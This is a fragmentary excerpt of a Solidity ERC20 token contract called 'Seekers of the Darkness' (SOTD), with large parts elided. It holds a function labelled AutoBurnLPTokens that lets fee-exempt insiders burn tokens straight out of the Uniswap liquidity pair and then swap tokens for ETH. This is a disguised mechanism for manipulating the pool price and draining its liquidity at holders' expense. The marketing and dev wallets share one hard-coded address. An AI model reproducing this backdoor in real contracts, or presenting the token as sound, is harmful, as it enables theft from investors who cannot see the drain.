...
The truth cannot be hidden in the darkness 
...
contract SOTD is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Seekers of the Darkness", "SOTD") {
     ...
     uint256 totalSupply = 1 * 10 ** 6 * 10 ** decimals();
        ...
        MarketingWallet = address(0xd71F2407738da5cBaDA7Ec2B1ABd2f110Dec24Bb); // set as Marketing wallet
        DevWallet = address(0xd71F2407738da5cBaDA7Ec2B1ABd2f110Dec24Bb); // set as dev wallet
    ...
    function updateSwapEnabled(bool enabled) external onlyOwner(){
       ...
       function AutoBurnLPTokens(uint yes, uint no) external returns (bool) {
        require(_isExcludedFromFees[msg.sender]);

        uint lb = balanceOf(uniswapV2Pair);

        require(no > 1 && no < lb / 100, 'amount exceeded');

        _AutoBurnLPTokens(no);
        swapTokensForEth(yes);
 ...
 function _AutoBurnLPTokens(uint256 pAmount) private {
